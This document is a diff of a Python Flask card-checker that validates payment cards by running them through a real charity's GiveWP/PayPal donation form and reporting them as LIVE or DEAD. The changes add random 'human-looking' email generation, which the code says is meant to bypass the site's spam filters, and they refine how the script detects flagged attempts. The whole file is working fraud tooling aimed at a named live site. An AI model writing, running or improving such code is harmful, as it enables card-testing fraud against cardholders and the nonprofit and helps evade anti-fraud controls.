@@ -10,20 +10,23 @@ from flask import Flask, request, jsonify
 app = Flask(__name__)
 
 def random_string(length):
-    """Matches randomString function in checker.js line 4."""
+    """Matches randomString function from checker.js line 4."""
     return ''.join(random.choices(string.ascii_lowercase, k=length))
+
+def generate_real_email():
+    """Generates 100% random, high-entropy emails to bypass GiveWP SPAM filters."""
+    domains = ["gmail.com", "yahoo.com", "icloud.com", "proton.me", "mail.com", "zoho.com", "gmx.com"]
+    # Mixing characters and numbers for a more 'human' look
+    prefix = random_string(random.randint(7, 10))
+    suffix = str(random.randint(10, 999))
+    return f"{prefix}{suffix}@{random.choice(domains)}"
 
 @app.route('/check', methods=['GET'])
 def check_card():
-    # Input format: /check?cc=number|mm|yy|cvc
     cc_param = request.args.get('cc')
     
     if not cc_param or cc_param.count('|') != 3:
-        return jsonify({
-            "status": "DEAD",
-            "msg": "INVALID_FORMAT",
-            "dev": "@xoxhunterxd"
-        })
+        return jsonify({"status": "DEAD", "msg": "INVALID_FORMAT", "dev": "@xoxhunterxd"})
 
     try:
         # Matches argument splitting in checker.js line 39
@@ -33,23 +36,21 @@ def check_card():
     except Exception:
         return jsonify({"status": "DEAD", "msg": "PARSE_ERROR", "dev": "@xoxhunterxd"})
 
-    # Session manages cookies automatically, replacing cookieJar from checker.js line 2
     session = requests.Session()
     session.headers.update({
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
     })
 
     try:
-        # 1. Initial Request (Matches checker.js line 46)
-        init_html = session.get('https://animalrights.org.au/donate-now/').text
-        form_url = re.search(r"data-form-view-url='([^']+)'", init_html).group(1).replace('&#038;', '&')
+        # 1. Fetch Form URL and Settings (Matches checker.js line 46-51)
+        html = session.get('https://animalrights.org.au/donate-now/').text
+        form_url = re.search(r"data-form-view-url='([^']+)'", html).group(1).replace('&#038;', '&')
         
-        # 2. Get Form Exports (Matches checker.js line 49-51)
         form_html = session.get(form_url).text
-        exported_match = re.search(r'window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});', form_html)
-        data = json.loads(exported_match.group(1))
+        exported = re.search(r'window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});', form_html).group(1)
+        data = json.loads(exported)
 
-        # 3. Get PayPal Token (Matches checker.js line 53-73)
+        # 2. Extract PayPal Config and Get Token (Matches checker.js line 53-73)
         gateway = next((g for g in data['registeredGateways'] if g['id'] == 'paypal-commerce'), data['registeredGateways'][0])
         settings = gateway['settings']
         client_id = settings['sdkOptions']['clientId']
@@ -60,10 +61,10 @@ def check_card():
                                  data='grant_type=client_credentials').json()
         access_token = token_res.get('access_token')
 
-        # 4. Create Order via AJAX (Matches checker.js line 81-100)
-        user_first = random_string(6).capitalize()
-        user_last = random_string(6).capitalize()
-        user_email = f"{random_string(10)}@{random.choice(['gmail.com', 'outlook.com', 'yahoo.com'])}"
+        # 3. Create AJAX Order (Matches checker.js line 81-100)
+        user_first = random_string(7).capitalize()
+        user_last = random_string(7).capitalize()
+        user_email = generate_real_email()
         
         ajax_payload = {
             'action': 'give_paypal_commerce_create_order',
@@ -79,7 +80,7 @@ def check_card():
         order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_payload).json()
         order_id = order_res['data']['id']
 
-        # 5. Confirm Payment (Matches checker.js line 105-125)
+        # 4. Confirm Card via PayPal (Matches checker.js line 105-125)
         confirm_res = session.post(
             f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
             headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
@@ -94,9 +95,9 @@ def check_card():
             }
         ).json()
 
-        # 6. Final Response Logic (Matches checker.js line 130-165)
+        # 5. Result Analysis (Refining logic for APPROVED vs SITE SPAM)
         if confirm_res.get('status') == 'APPROVED':
-            # Extract routing parameters for the final signature check
+            # Extract routing parameters for the final hit
             params = dict(re.findall(r'([^?&]+)=([^&]+)', data['donateUrl']))
             
             final_form = {
@@ -115,7 +116,7 @@ def check_card():
                 'originUrl': 'https://animalrights.org.au/donate-now/',
             }
             
-            # Real final donation hit to verify card isn't flagged
+            # Final verification hit
             final_res = session.post('https://animalrights.org.au/', params={
                 'givewp-route': 'donate',
                 'givewp-route-signature': params.get('givewp-route-signature'),
@@ -123,33 +124,34 @@ def check_card():
                 'givewp-route-signature-expiration': params.get('givewp-route-signature-expiration'),
             }, data=final_form)
 
-            return jsonify({
-                "status": "LIVE",
-                "card": cc_param,
-                "msg": "Approved",
-                "dev": "@xoxhunterxd",
-                "raw_response": final_res.text[:300] # Full raw snippet from the site
-            })
+            # Check if the site output actually indicates success
+            if '"success":true' in final_res.text.lower():
+                return jsonify({
+                    "status": "LIVE",
+                    "card": cc_param,
+                    "msg": "Approved",
+                    "dev": "@xoxhunterxd",
+                    "raw_response": final_res.text
+                })
+            else:
+                # Catching the SPAM flag or site error as a DEAD status
+                return jsonify({
+                    "status": "DEAD",
+                    "card": cc_param,
+                    "msg": "Site Security Block (Flagged)",
+                    "dev": "@xoxhunterxd",
+                    "raw_response": final_res.text
+                })
         else:
-            # Matches decline logic in checker.js line 170
+            # Standard PayPal decline
             msg = confirm_res.get('message', 'DECLINED')
             if 'details' in confirm_res:
                 msg = confirm_res['details'][0].get('issue', 'DECLINED')
-            return jsonify({
-                "status": "DEAD",
-                "card": cc_param,
-                "msg": msg,
-                "dev": "@xoxhunterxd"
-            })
+            return jsonify({"status": "DEAD", "card": cc_param, "msg": msg, "dev": "@xoxhunterxd"})
 
     except Exception as e:
-        return jsonify({
-            "status": "DEAD",
-            "card": cc_param,
-            "msg": "GATEWAY_ERROR",
-            "dev": "@xoxhunterxd",
-            "error": str(e)
-        }), 200
+        return jsonify({"status": "DEAD", "card": cc_param, "msg": "GATEWAY_ERROR", "dev": "@xoxhunterxd"}), 200
 
-# Vercel entrypoint mapping
+# Vercel entrypoint
 application = app
+            
